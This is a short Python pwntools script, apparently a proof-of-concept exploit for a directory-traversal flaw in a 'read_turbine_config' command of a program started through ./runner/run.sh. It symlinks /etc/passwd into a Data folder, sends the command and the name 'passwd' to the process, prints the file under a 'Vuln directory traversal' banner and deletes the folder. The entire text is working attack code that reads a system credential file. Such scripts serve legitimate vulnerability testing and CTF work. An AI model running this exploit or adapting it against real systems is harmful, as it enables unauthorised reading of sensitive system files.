#!/usr/bin/python3

from pwn import *
import os
import warnings

warnings.filterwarnings("ignore", category=BytesWarning)
context.log_level = 'error'

env = os.environ.copy()
env['LD_LIBRARY_PATH'] = './runner/external/'

os.system("mkdir -p Data; cd Data")
os.system("ln -s /etc/passwd Data/passwd; cd ..")

pid = process(['./runner/run.sh'], env=env)
pid.recv(numb=100, timeout=1.0)
pid.sendline(b'read_turbine_config')

pid.recv(timeout=1.0)
pid.sendline(b'passwd')

print(text.red("[+]") + " Vuln directory traversal - read_turbine_config:")
os.system("cat Data/passwd")
print()
os.system("rm -rf Data")